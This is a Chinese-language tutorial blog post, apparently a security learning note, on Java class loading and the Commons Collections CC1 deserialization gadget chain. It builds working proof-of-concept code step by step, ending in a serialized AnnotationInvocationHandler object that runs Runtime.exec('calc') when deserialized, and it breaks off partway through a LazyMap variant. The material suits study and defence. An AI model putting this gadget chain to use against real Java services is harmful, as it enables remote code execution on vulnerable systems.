+<p>通过调试发现，<code>loadclass</code>会进入Launcher然后再调用到当前类的一个重载方法，然后去加载这个类，这里就用到了双亲委派机制，一级一级往下看能不能加载：<code>BootstrapClassLoader-&gt;ExtensionClassLoader-&gt;ApplicationClassLoader -&gt; customClassLoader</code>（通过不同的路径去加载，对应的加载器加载对应路径的class），避免触发安全漏洞。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112143559313.png" class="">
+
+<p>然后就会进入到<code>URLClassLoader</code>中的<code>findClass</code>方法，然后通过调用进入到<code>SecureClassLoader</code>中的<code>defineClass</code>，最终会进入到<code>ClassLoader</code>类中的方法<code>defineClass</code>，它的参数：<code>类名，类的字节码，类的起始位置，类的长度，保护域（一般为null）</code>，接着进入当前类的native方法。</p>
+<p>继承关系：<code>ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;(ExtClassLoader、AppClassLoader)</code></p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112144618218.png" class="">
+
+<p>既然底层方法是ClassLoader中的defineClass，那么我们可以使用反射调用加载任意的类。</p>
+<h2 id="2）ClassLoader利用"><a href="#2）ClassLoader利用" class="headerlink" title="2）ClassLoader利用"></a>2）ClassLoader利用</h2><p>攻击类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyExp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用ClassLoader动态加载对应的类，使用底层调用的<code>defineClass</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class&lt;?&gt; clazz = ClassLoader.class;</span><br><span class="line">        <span class="comment">//因为类是抽象类，方法是protected所以得用反射调用</span></span><br><span class="line">        Method method = clazz.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class, ProtectionDomain.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//路径为对应exp的字节码路径</span></span><br><span class="line">        <span class="keyword">byte</span>[] data = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\idea\\IdeaRepository\\WebSecurity\\WatchSrcPro\\out\\production\\WatchSrcPro\\MyExp.class&quot;</span>));</span><br><span class="line">        Class&lt;?&gt; exp = (Class&lt;?&gt;) method.invoke(classLoader, <span class="string">&quot;MyExp&quot;</span>, data, <span class="number">0</span>, data.length, <span class="keyword">null</span>);</span><br><span class="line">        exp.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="3）URLClassLoader利用"><a href="#3）URLClassLoader利用" class="headerlink" title="3）URLClassLoader利用"></a>3）URLClassLoader利用</h2><p>攻击类还是一样</p>
+<p>利用URLClassLoader，使用其<code>loadClass</code>方法（父类的方法），也可以使用findClass（使用反射）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//        URL url = new URL(&quot;file:///D:\\idea\\IdeaRepository\\WebSecurity\\WatchSrcPro\\out\\production\\WatchSrcPro\\&quot;);</span></span><br><span class="line"><span class="comment">//        URL url = new URL(&quot;http://localhost:1111/&quot;);  使用python在对应目录下开启服务</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;jar:file:///D:\\idea\\IdeaRepository\\WebSecurity\\WatchSrcPro\\out\\production\\WatchSrcPro\\MyExp.jar!/&quot;</span>);</span><br><span class="line">        URLClassLoader ucl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class&lt;?&gt; exp = ucl.loadClass(<span class="string">&quot;MyExp&quot;</span>);</span><br><span class="line">        exp.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4）UnSafe利用"><a href="#4）UnSafe利用" class="headerlink" title="4）UnSafe利用"></a>4）UnSafe利用</h2><p>这个类使用了单例模式，需要通过反射创建，里面有一个字段<code>theUnsafe</code>就是那个单例。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;</span><br><span class="line">        Field theUnsafe = unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafe.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Unsafe o = (Unsafe) theUnsafe.get(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] data = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\idea\\IdeaRepository\\WebSecurity\\WatchSrcPro\\out\\production\\WatchSrcPro\\MyExp.class&quot;</span>));</span><br><span class="line">        ClassLoader classLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class&lt;?&gt; myExp = o.defineClass(<span class="string">&quot;MyExp&quot;</span>, data, <span class="number">0</span>, data.length, classLoader, <span class="keyword">null</span>);</span><br><span class="line">        myExp.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="5）总结"><a href="#5）总结" class="headerlink" title="5）总结"></a>5）总结</h2><ul>
+<li>URLClassLoader#loadClass -&gt; 任意类加载（file/http/jar）</li>
+<li>ClassLoader#defineClass -&gt; 字节码加载任意类 （私有方法）</li>
+<li>Unsafe#defineClass -&gt; 字节码加载任意类 （类单例）</li>
+</ul>
+<h1 id="2、CC链"><a href="#2、CC链" class="headerlink" title="2、CC链"></a>2、CC链</h1><p>使用环境：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8u65的sun包源码：http:<span class="comment">//hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</span></span><br><span class="line">jdk8u65：https:<span class="comment">//www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1）反序列漏洞思路"><a href="#1）反序列漏洞思路" class="headerlink" title="1）反序列漏洞思路"></a>1）反序列漏洞思路</h2><p>首先入口类一定实现可序列化接口，并且重写了<code>readObject</code>方法，它可以接收任意对象作为参数。</p>
+<p>需要找的可序列化对象：一般都是集合类型、接收Object对象、接收Map</p>
+<p>我们需要找链式方法调用，并且该类可以接收任意对象</p>
+<p>而Commons Collections中大多都是集合类，所以只需要找到方法调用即可。</p>
+<h2 id="2）CC1链"><a href="#2）CC1链" class="headerlink" title="2）CC1链"></a>2）CC1链</h2><blockquote>
+<p>漏洞利用版本</p>
+</blockquote>
+<ul>
+<li>Commons Collections&lt;=3.2.1</li>
+<li>jdk8版本在71之前</li>
+</ul>
+<p>CC链最主要的类就是<code>org.apache.commons.collections.Transformer</code>，它是一个接口，可以理解为是一个转换器，它只有一个方法，将输入的对象进行转换。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112175738270.png" class="">
+
+<h3 id="1、接口实现类"><a href="#1、接口实现类" class="headerlink" title="1、接口实现类"></a>1、接口实现类</h3><p>它一共有14个实现类。其中使用较多的：</p>
+<p><code>org.apache.commons.collections.functors.ChainedTransformer</code>这是一个链式转换器，它的接口实现方法就是将输入的对象以链式进行转换，构造方法需要传递一个数据类型为Transformer的实现类。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112175951739.png" class="">
+
+<p><code>org.apache.commons.collections.functors.ConstantTransformer</code>这是个常量转换器，构造时需要给一个常量，然后接口方法无论输入什么都返回它。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112201224616.png" class="">
+
+<p><code>org.apache.commons.collections.functors.InvokerTransformer</code>这是一个任意方法调用的转换器，调用输入对象的对应方法，只能是公有的。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112201520002.png" class="">
+
+<p><code>org.apache.commons.collections.functors.NOPTransformer</code>这是转换器无论输入什么都返回你的输入。。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112201647855.png" class="">
+
+<p><code>org.apache.commons.collections.functors.InstantiateTransformer</code>这个调用任意构造方法的转换器，通过输入的参数等进行实例化。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114000049205.png" class="">
+
+<h3 id="2、雏形"><a href="#2、雏形" class="headerlink" title="2、雏形"></a>2、雏形</h3><p>发现<code>InvokerTransformer</code>可以任意方法调用，那么我们可以构造一下代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Runtime runtime = Runtime.getRuntime();</span><br><span class="line">    InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    invokerTransformer.transform(runtime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用这段代码，它会执行<code>runtime.exec(&quot;calc&quot;)</code>，此时就会发生命令执行。</p>
+<p>这个时候我们想要的就做到了，任意命令执行。</p>
+<p>所以我们可以通过链式找到上一层的调用。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112202317676.png" class="">
+
+<p>找到对应的方法，点击<code>Find Usages</code>找到调用者。</p>
+<p>发现有21个调用者，但是我们肯定要找不同类的调用。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112202557367.png" class="">
+
+<p>通过发现，找到了多个符合可以存放任意对象，并且还能调用我们的transform，那么可以尝试利用。因为<code>TransformedMap</code>有多个，所以可以尝试它，如果我们能找到一个对象里的readObject方法调用了这3个方法中的一个，那么这条链就出现了，实在没有还可以再走多层。</p>
+<p>所以得一个个试，选用<code>checkSetValue</code>这个方法。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112203354588.png" class="">
+
+<p>查看构造函数发现是受保护的，应该自己会调用。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112203417189.png" class="">
+
+<p>发现当前类中有一个静态方法调用这个，所以后续创建对象可以用这个。</p>
+<p>然后我们再去找<code>checkSetValue</code>这个方法的调用地点。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112203558952.png" class="">
+
+<p>成功找到了它在<code>MapEntry</code>中，我们知道Map每个元素就是一个Entry，可以通过EntrySet方法获取，那我们猜测这个类也是，通过上面的调用链也可以验证。在其父类<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator</code>中的<code>entrySet()</code>返回了它自定义的<code>EntrySet</code>，里面的<code>iterator</code>方法返回了<code>EntrySetIterator</code>，而这个类的每一次迭代就是返回了一个Entey。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112203911569.png" class="">
+
+<h3 id="3、小有所成"><a href="#3、小有所成" class="headerlink" title="3、小有所成"></a>3、小有所成</h3><p>所以我们可以创建一个<code>TransformedMap</code>对象，通过遍历它使它调用我们的transform方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Runtime runtime = Runtime.getRuntime();</span><br><span class="line">    InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    hashMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    Map&lt;Object,Object&gt; map = TransformedMap.decorate(hashMap, <span class="keyword">null</span>, invokerTransformer);</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;Object,Object&gt; entry : map.entrySet()) &#123;</span><br><span class="line">        entry.setValue(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释：</p>
+<p><code>hashMap.put(&quot;1&quot;,&quot;1&quot;);</code>放入值是因为需要遍历，而遍历的就是这个集合。</p>
+<p><code>entry.setValue(runtime);</code>调用方法时，会使用TransformedMap中的valueTransformer去调用它的transform方法，所以我们得传入runtime对象，让其去执行刚刚的链。</p>
+<p>这条链构造完了我们需要尽可能的找到一个对象的readObject方法调用了<code>setValue</code>，通过<code>find usages</code>。</p>
+<p>成功的在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类中发现了它的readObject方法调用了setValue!</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112210633401.png" class="">
+
+<p>查看构造方法，memberValues是我们可控的，那我们可以传入TransformedMap，type是注解类型的Class，这里它这个类是一个default权限，我们访问不到，所以就得使用反射创建这个对象。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112210819481.png" class="">
+
+<p>到了这一步就出现了几个问题：</p>
+<ol>
+<li>我们需要传入runtime对象，但是发现readObject方法中不能控制runtime</li>
+<li>在执行之间还有几层if判断</li>
+<li>最终需要进行序列化，而runtime对象没有实现可序列化接口</li>
+</ol>
+<h3 id="4、问题解决"><a href="#4、问题解决" class="headerlink" title="4、问题解决"></a>4、问题解决</h3><blockquote>
+<p>runtime序列化解决</p>
+</blockquote>
+<p>虽然runtime无法进行序列化，但是Class对象是可以序列化的。</p>
+<p>我们只需要传入Class对象，然后通过InvokerTransformer进行调用就可以创建，再使用链式相连，即可解决问题。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runtimeSerResolve</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class&lt;Runtime&gt; rClass = Runtime.class;</span><br><span class="line">    Method getMethod = (Method) <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;).transform(rClass);</span><br><span class="line">    Runtime r = (Runtime) <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;).transform(getMethod);</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就完成了Runtime无法序列化问题，看着有点懵，理清了还好。</p>
+<p>再使用ChainedTransformer进行链式调用，成功构造代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runtimeSerResolve</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    Class&lt;Runtime&gt; rClass = Runtime.class;</span><br><span class="line">    ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    chainedTransformer.transform(rClass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>判断解决</p>
+</blockquote>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112222844981.png" class="">
+
+<p>首先获取到memberTypes是该注解的键值对信息，即属性名-&gt;类型Class键值对。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112222933549.png" class="">
+
+<p>然后下去先拿到memberValue中的键，这里的memberValue就是我们可以控制的TransformedMap，也就是拿到了我们自己输入的键为name变量。再通过注解信息的那个map去获取这个键对应的值，所以我们需要在TransformedMap中的map里放入一个注解的属性名作为key，并且type为该注解。</p>
+<p>这里我们随便选择一个java元注解。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220112223320405.png" class="">
+
+<p>也就是TransformedMap中的map放入键值对，它的key为<code>value</code>。</p>
+<p>然后在AnnotationInvocationHandler构造时type使用Retention即可成功解决问题。</p>
+<p>第二个if是判断获取的注解类型是否是当前循环的value的实例，显然不是，取反就可以成功进入到setValue方法中！</p>
+<h3 id="5、成功成链"><a href="#5、成功成链" class="headerlink" title="5、成功成链"></a>5、成功成链</h3><p>最后还有一个问题就是它在进入setValue的方法中是，它的参数并不是我们想要传进入的<code>Runtime.class</code>，而是这里已经写好的一个代理类，他被作为了transformer链的一个参数传递进去了，这个时候我们想到了一个实现类<code>ConstantTransformer</code>，这个类的原理是不论transformer传进来什么，我都只返回给你构造时候传进来的iConstant这个变量，那么一条链就成功构成了。</p>
+<p>成功执行代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class&lt;Runtime&gt; rClass = Runtime.class;</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(rClass),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    Map&lt;Object, Object&gt; map = TransformedMap.decorate(hashMap, <span class="keyword">null</span>, chainedTransformer);</span><br><span class="line">    Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object o = constructor.newInstance(Retention.class, map);</span><br><span class="line"></span><br><span class="line">    writeObject(o);</span><br><span class="line">    readObject();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;obj.ser&quot;</span>));</span><br><span class="line">    oos.writeObject(o);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;obj.ser&quot;</span>));</span><br><span class="line">    ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用图：</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113141655060.png" class="">
+
+<h2 id="3）另一条CC1链"><a href="#3）另一条CC1链" class="headerlink" title="3）另一条CC1链"></a>3）另一条CC1链</h2><p>在java反序列工具<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a>中使用的CC1链是利用的LazyMap。其<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java">调用链</a>：</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113142138674.png" class="">
+
+<p>这条CC1链后面的链式都一样，只不过用LazyMap替换了TransformedMap，LazyMap调用的是get方法。get方法的调用者实在太多了，我们直接利用现成的payload去复现吧。</p>
+<h3 id="1、分析"><a href="#1、分析" class="headerlink" title="1、分析"></a>1、分析</h3><p>LazyMap构造方法也是受保护的，它的创建和TransformedMap类似，通过静态方法创建，我们只需要调用其get方法就可以调用到后面的链，并且factory还是用户提供的，所以利用非常简单，只需要保证在map中没有这个get方法参数的key就行了，他就能走进if，一种单例懒加载的实现。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113143156749.png" class="">
+
+<p>上一层的调用为：<code>annotationInvocationHandler.invoke()</code>，我们知道这个类是动态代理的一个调用处理器类，invoke方法就是去调用代理方法的。所以我们只需要创建代理类，调用其方法就能去执行invoke。而它这里使用的代理类是一个Map，入口类还是<code>annotationInvocationHandler</code>类，调用它的readObject方法触发其代理的invoke。</p>
+<p>因为Invoke做了处理，所以观察其处理：</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113144547007.png" class="">
+
+<p>首先可以看到，memberValues是我们可以控制的，所以就利用这个函数。</p>
+<p>然后看61行的第一个判断，如果方法名为equals，参数为1并且参数为Object类型就退出。</p>
+<p>64行判断，如果参数个数不为空就退出，因为它是来代理注解的，注解方法都是没有参数的。</p>
+<p>然后就去switch判断，如果是<code>toString、hashCode、annotaionType</code>就退出，其他都能走到get方法。</p>
